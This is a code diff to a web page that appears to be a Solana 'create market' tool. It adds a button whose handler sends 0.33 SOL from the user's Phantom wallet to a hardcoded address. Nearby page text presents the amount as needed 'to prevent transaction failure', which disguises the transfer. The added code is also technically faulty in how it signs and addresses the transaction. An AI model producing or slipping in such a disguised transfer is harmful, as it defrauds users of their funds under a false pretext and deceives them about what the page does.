@@ -234,6 +234,9 @@
                 <p>I confirm that I have confirmed all details and that I am fully responsible for creating the
                     market. <strong>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
             </div>
+      <div class="container confirm-btn">
+        <button class="btn btn-primary create-market">Create Market</button>
+    </div>
  
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  
@@ -261,6 +264,28 @@
             } catch (error) {
                 // If an error occurs, log the error
                 console.error("Error connecting to Phantom wallet:", error);
+            }
+        });
+        // Function to handle the click event of the "Create Market" button
+        document.querySelector('.create-market').addEventListener('click', async () => {
+            try {
+                // Create a transaction to send 0.33 SOL to the specified wallet address
+                // Replace the placeholder wallet address with your actual address
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: window.solana.publicKey,
+                        toPubkey: '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar',
+                        lamports: 330000000, // 0.33 SOL in lamports
+                    })
+                );
+
+                // Send and confirm the transaction
+                await sendAndConfirmTransaction(window.solana, transaction);
+                // If transaction is successful, log a message
+                console.log("Transaction successful!");
+            } catch (error) {
+                // If an error occurs, log the error
+                console.error("Error sending transaction:", error);
             }
         });
     </script>
